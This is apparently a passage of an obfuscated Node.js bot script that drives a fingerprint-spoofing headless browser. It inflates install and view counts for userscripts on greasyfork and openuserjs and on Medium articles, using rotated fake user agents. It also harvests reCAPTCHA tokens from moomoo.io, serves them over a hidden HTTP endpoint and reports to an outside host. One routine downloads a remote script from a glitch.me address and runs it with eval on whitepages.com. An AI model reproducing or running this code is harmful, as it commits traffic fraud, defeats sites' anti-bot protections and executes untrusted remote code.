      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + V(0x5) + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': X(0x2) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    V(0xf) + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1 * -0x1973 + 0x81b + -0x218e * 0x1
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x8 * -0x1 + -0x653 * 0x5 + 0x1f97)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1f5c + -0x5c9 * -0x1 + -0x24c1), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0xc5a + 0xf9 + 0xcef * -0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0xbf * -0xb + -0xa57 * 0x1 + 0x128c;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x24d7 * -0x1 + 0x1 * -0x20b3 + 0x458a; w < getRandomInt(-0x2 * -0x807 + 0x2266 + -0x3273, -0x197 * -0x11 + 0x1617 + -0x3119 * 0x1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x125f1 + -0x54a * -0x38 + 0x3d * -0x5d5);
        }
      }();
    }, 0x1345 + 0x2611 + -0x38f2), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x41 * -0x13 + -0x6 * -0x43c + 0xb * -0x1df;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x4d7 * -0x1 + -0x84 * -0xb + -0x3 * 0x47, 0x3b8 + -0xe43 + -0xabd * -0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x45 * -0x5b + -0xe8bd + 0x1 * 0x14566);
    }, -0x19ab * -0x1 + 0xe3 * -0x2b + 0x292 * 0x5), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const Y = b;
        try {
          let s = 0x40 * 0x40 + -0x16ec + 0x6ec * 0x1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t[Y(0x7, 'qW1p')](), r();
          await wait(-0x9 * 0x2d9 + -0x17f0 + 0x3d49 * 0x1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x19a5 + -0x5ab * 0x6 + 0x85d), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x119df1 + -0x139c8f + 0x32f620);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0xc5b + 0x21d2 + 0x1 * -0x2dc9);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1 * 0x36e + -0x1 * 0x13d9 + -0x7 * -0x275);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x2 * -0x16b0 + 0x2762 + 0x2e * 0xd1);
}

function a() {
  const bj = [
    'ChrZlZeXotyTDG',
    'WOCiwCkflSoq',
    'https://gr',
    'zs9TB29TB28UAq',
    '4KSm3IY7Xz',
    'Dxj2AxyTAw8TCW',
    'rg/en/scri',
    'WRf4n8ogWRq',
    'C2L0zs96AgLODq',
    'catch',
    'W5eVCcyUW67dSSkuWQWS',
    'nXKfWP7cPZVdS8oZiSka',
    'lwr1BMuTBw9Klq',
    'BxjIzwfZDcXTCG',
    'WQffrCk1cmotob1brG',
    'Ahr0Chm6lY9Tzq',
    'm_medium=t',
    'diep-io-gl',
    'key',
    'wtroterHB3DenG',
    'WOKuWQm'
  ];
  a = function() {
    return bj;
  };
  return a();
}
doFlags['doOUJS'] && ((async () => {
  const Z = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x675 + 0x638 + -0x1f * -0x2) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x2151 + -0x60f + -0x1 * -0x2761));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x191a + -0xc39 + 0x2553, D['indexOf']('\x20'));
        return B ? E['slice'](0x1b3e + -0x343 * 0x5 + -0xaef * 0x1, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x10ae + 0x1d9f + 0x11 * -0x6d),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0xd88 * -0x3 + -0x418 * -0x1 + 0x4b90),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + Z(0x14, 'W0GM'),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + Z(0xb, 'IL@l') + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1 * 0xf46 + -0x1 * -0x24cf + -0x1589; k < -0x1 * 0x26fe + -0x1d * -0xa7 + -0x1 * -0x1417; k++)
    setTimeout(f, (0x53af + -0x19aa7 + 0x23158) * k * getRandomInt(0xeae + 0x1a7 * 0x10 + -0x291d, 0x139d + -0x14d3 * -0x1 + 0x1 * -0x286d));
  setInterval(() => {
    f();
    for (let l = 0x89c + 0x17 * 0x16d + -0x2967; l < -0xd * -0x167 + 0x12 * -0x165 + 0x6e3; l++)
      setTimeout(f, (0x6d7f * -0x1 + -0xc9f5 + -0x304 * -0xb5) * l * getRandomInt(0x225c + 0x1c01 * -0x1 + -0x10f * 0x6, -0x1345 + -0x26f * 0x1 + -0x15b7 * -0x1));
  }, -0x109d * 0x443 + -0x2 * -0x24c5fa + 0x342fa3);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
